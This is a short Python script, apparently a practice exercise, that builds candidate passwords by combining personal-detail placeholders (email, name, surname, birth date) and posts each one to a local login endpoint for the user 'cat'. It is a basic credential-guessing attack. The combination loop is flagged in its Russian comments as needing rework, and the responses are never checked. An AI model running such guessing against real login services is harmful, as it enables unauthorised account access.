import requests

i=0

email_user_t = "11"
name_user_t = "22"
sername_user_t = "33"
date_birth_t = "44"

list_of_passwords = []

list_of_passwords.append(email_user_t)
list_of_passwords.append(name_user_t)
list_of_passwords.append(sername_user_t)
list_of_passwords.append(date_birth_t)

print (list_of_passwords)


i = 5
lengthPaths = 2
len_list = len(list_of_passwords)
base = len_list

while True:
    password_cur = ''
    temp = i
    k = 0

    while temp !=0:
        rest = temp % base
        temp = temp // base

        if k != rest:
            password_cur = list_of_passwords.__getitem__(rest) + list_of_passwords.__getitem__(k)
            list_of_passwords.append(password_cur)
        k+=1

    #Если значение в пароле последнее, то ...
    #Переделать условие
    if k>len_list:
        lengthPaths += 1
        i = 0
    else:
        i += 1

    if lengthPaths>5:
        break






print (list_of_passwords)
print("count = " , len(list_of_passwords))

for passw in list_of_passwords:

    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'cat', 'password': passw})

